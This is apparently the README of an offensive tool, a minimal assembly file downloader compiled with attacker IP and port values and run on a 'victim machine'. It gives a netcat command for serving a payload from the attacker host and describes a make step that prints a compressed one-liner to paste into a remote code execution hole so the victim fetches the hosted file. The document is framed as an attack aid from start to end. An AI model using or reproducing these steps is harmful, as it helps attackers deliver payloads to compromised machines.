# Simple minimalistic file downloader
## Prerequisites
Can be installed with your package manager (probably).
```
make nasm
```

## Usage
On attacker machine, you need to compile the downloader. You can specify parameters in the makefile, or using environment variables.
The parameters are:
- `LHOST`: attacker IP
- `LPORT`: attacker port
- `RMODE`: (currently broken, TBD)
- `RFILE`: path, where the transferred file will be written on target machine

After filling in the parameters follow the procedure:
1. Fill in the values into `downloader.asm.tpl` and compile the downloader:
```shell
make
```
2. By some means, deliver the downloader to the victim machine (if `xz(1)` is present on the victim machine, see **Compression**)
3. Start hosting the file you want delivered on your attacker machine using:
```shell
cat file | nc -lvnp <LPORT> -q 2
```
4. Launch the downloader on the victim machine
5. The netcat will close the connection 2 seconds after the file is transmitted

## Compression
The compiled downloader is rather small alone(abt. `8KB`), but when compressed with `xz(1)`, it will occupy about `500B` of space.
When encoded in `base64`, this will be about `800B`


In order to transfer, decompress and launch the downloader: **Before running this command, make sure that you are hosting the payload using `nc(1)`**
```shell
make xz-compress
```
This will print out the command you need to paste into the RCE of your choice to download the hosted file
